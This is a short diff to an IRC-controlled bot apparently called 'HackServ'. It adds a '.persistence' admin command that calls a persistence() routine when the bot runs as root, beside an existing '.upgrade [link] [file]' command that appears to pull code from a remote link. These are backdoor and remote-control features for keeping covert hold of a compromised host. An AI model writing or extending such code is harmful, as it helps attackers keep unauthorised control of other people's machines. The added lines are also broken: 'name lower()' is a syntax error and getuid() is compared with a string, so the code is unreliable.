@@ -698,6 +698,15 @@ def main(): # This is the main function for all of the bot controls.
                         message = "Only Linux is currently supported."
                     sendntc(message, name)
                                 
+                # Respond to '.persistence' command from admin.
+                if name lower() == adminname.lower() and message.find('.persistence') != -1:
+                    if os.getuid() == 'root':
+                        message = "Attempting to create persistence."
+                        persistence()
+                    else:
+                        message = "HackServ does not have 'root' permissions."
+                    sendntc(message, name)
+                
                 # Respond to '.upgrade [link] [file]' command from admin.
                 if name.lower() == adminname.lower() and message.find('.upgrade') != -1:
                     target = message.split(' ', 1)[1]
